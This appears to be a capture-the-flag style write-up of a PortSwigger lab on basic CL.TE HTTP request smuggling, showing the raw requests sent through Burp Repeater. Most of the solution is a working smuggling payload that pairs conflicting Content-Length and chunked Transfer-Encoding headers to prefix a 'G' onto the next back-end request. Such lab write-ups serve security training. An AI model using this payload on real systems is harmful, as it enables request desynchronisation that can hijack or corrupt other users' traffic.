
# HTTP request smuggling, basic CL.TE vulnerability

This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding. The front-end server rejects requests that aren't using the GET or POST method.

To solve the lab, smuggle a request to the back-end server, so that the next request processed by the back-end server appears to use the method GPOST.

Note: Although the lab supports HTTP/2, the intended solution requires techniques that are only possible in HTTP/1. You can manually switch protocols in Burp Repeater from the Request attributes section of the Inspector panel.

Tip: Manually fixing the length fields in request smuggling attacks can be tricky. Our HTTP Request Smuggler Burp extension was designed to help. You can install it via the BApp Store.


---------------------------------------------

References: 

- https://portswigger.net/web-security/request-smuggling



![img](images/HTTP%20request%20smuggling,%20basic%20CL.TE%20vulnerability/1.png)

---------------------------------------------

Intercept the request to “/” and change the HTTP method in the Repeater tab and the method to POST:

```
POST / HTTP/1.1
Host: 0ad100e2031e22e4802bfd8000b500ed.web-security-academy.net
Cookie: session=b8XcvijmPd8C0rUH0GtgGgXQW5YZ0n8c
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: https://0ad100e2031e22e4802bfd8000b500ed.web-security-academy.net/post?postId=2
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
```



![img](images/HTTP%20request%20smuggling,%20basic%20CL.TE%20vulnerability/2.png)


To smuggle the next request and add a "G" to it:

- *Transfer-Encoding: chunked* because the backend understands it
- *Content-Length: 14* so the G is not part of the payload

```
POST / HTTP/1.1
Host: 0ad100e2031e22e4802bfd8000b500ed.web-security-academy.net
Cookie: session=b8XcvijmPd8C0rUH0GtgGgXQW5YZ0n8c
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: https://0ad100e2031e22e4802bfd8000b500ed.web-security-academy.net
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
Content-Type: application/x-www-form-urlencoded
Content-Length: 14
Transfer-Encoding: chunked
Connection: close

3
x=y
0

G
```





![img](images/HTTP%20request%20smuggling,%20basic%20CL.TE%20vulnerability/3.png)
![img](images/HTTP%20request%20smuggling,%20basic%20CL.TE%20vulnerability/4.png)


The important part is the 0:



![img](images/HTTP%20request%20smuggling,%20basic%20CL.TE%20vulnerability/5.png)